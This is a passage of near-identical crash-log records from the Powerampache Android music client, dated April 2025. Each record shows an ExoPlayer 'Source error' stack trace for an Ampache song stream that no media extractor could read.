 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":28},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":144872517,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d9db5b87c5c2ed7a506342a9a2d4432d4\u0026type\u003dsong\u0026id\u003d50502"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
DmxGWHki,2025-04-17T18:48:49.153745,powerampache,PHP,Thursday 17th of April 2025 08:48:49 AM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":28},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":144872213,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d9db5b87c5c2ed7a506342a9a2d4432d4\u0026type\u003dsong\u0026id\u003d50502"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
TGBUmN4d,2025-04-17T18:48:48.919811,powerampache,PHP,Thursday 17th of April 2025 08:48:49 AM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":28},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":144872035,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d9db5b87c5c2ed7a506342a9a2d4432d4\u0026type\u003dsong\u0026id\u003d50502"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
Qzds3fJA,2025-04-17T18:48:48.434897,powerampache,PHP,Thursday 17th of April 2025 08:48:49 AM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":28},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":144871543,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d9db5b87c5c2ed7a506342a9a2d4432d4\u0026type\u003dsong\u0026id\u003d50502"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
3QAFiWeD,2025-04-17T18:48:48.210115,powerampache,PHP,Thursday 17th of April 2025 08:48:48 AM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":28},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":144871316,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/server/json.server.php"",""mCanonicalRepresentation"":1},""scheme"":""https"",""uriString"":""https://music.lyghters.ru/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d9db5b87c5c2ed7a506342a9a2d4432d4\u0026type\u003dsong\u0026id\u003d50502"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1137,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":637,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":201,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":288,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
zd7nBJjJ,2025-04-17T18:48:47.242194,powerampache,PHP,Thursday 17th of April 2025 08:48:48 AM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":28},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.internal.telephony.dataconnection"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.internal.telephony.dataconnection"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":1536,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":144870356,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""server"",""json.server.php""],""decoded"":""NOT 